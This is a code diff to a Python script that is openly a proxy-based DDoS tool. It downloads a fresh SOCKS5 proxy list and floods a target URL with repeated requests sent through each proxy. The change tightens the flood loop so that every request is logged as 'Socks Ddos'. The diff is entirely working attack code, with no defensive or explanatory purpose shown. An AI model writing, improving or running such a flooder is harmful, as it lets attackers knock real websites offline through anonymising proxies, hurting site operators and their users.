@@ -38,7 +38,7 @@ def main():
 	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=100&country=all')
+		rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=1000&country=all')
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
@@ -59,13 +59,9 @@ def atk():
 		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
 		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
-			s.get(url)
-			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
-			try:
-				for y in range(pow):
-					s.get(url)
-			except:
-				s.close()
+			for y in range(pow):
+				s.get(url)
+				print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 			print(Fore.RED + "Socks Down !" + Fore.WHITE)
